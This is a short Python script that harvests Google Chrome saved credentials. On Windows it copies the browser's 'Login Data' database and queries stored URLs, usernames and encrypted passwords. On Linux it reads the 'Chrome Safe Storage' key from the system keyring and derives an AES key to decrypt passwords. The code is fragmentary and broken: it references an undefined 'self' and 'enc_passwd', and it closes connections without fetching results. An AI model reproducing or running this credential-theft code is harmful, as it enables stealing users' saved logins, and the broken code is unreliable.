import secretstorage
import json
import platform
import sqlite3
import string
import subprocess
import os
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy
import platform

myos = platform.system()

if myos=="Windows":
    win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
    win_chrome_ver = [
        item for item in
        ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
        if os.path.exists(win_path.format(chrome=item))
    ]
    path = win_path.format(chrome=''.join(win_chrome_ver))
    win32crypt = import_module('win32crypt')
    copy(path + "Login Data", "Login Data.db")
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()
    cursor.execute("""
        SELECT action_url, username_value, password_value
        FROM logins; """)
    conn.close()
if myos=="Linux":
    my_pass = 'peanuts'.encode('utf8')
    bus = secretstorage.dbus_init()
    collection = secretstorage.get_default_collection(bus)
    for item in collection.get_all_items():
        if item.get_label() == 'Chrome Safe Storage':
            my_pass = item.get_secret()
            break
    iterations = 1
    salt = b'saltysalt'
    length = 16

    kdf = import_module('Crypto.Protocol.KDF')
    self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
    self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
    aes = import_module('Crypto.Cipher.AES')
    initialization_vector = b' ' * 16
    enc_passwd = enc_passwd[3:]
    cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
    decrypted = cipher.decrypt(enc_passwd)
    copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()
    cursor.execute("""
        SELECT action_url, username_value, password_value
        FROM logins; """)
    data = {'data': []}
    conn.close()
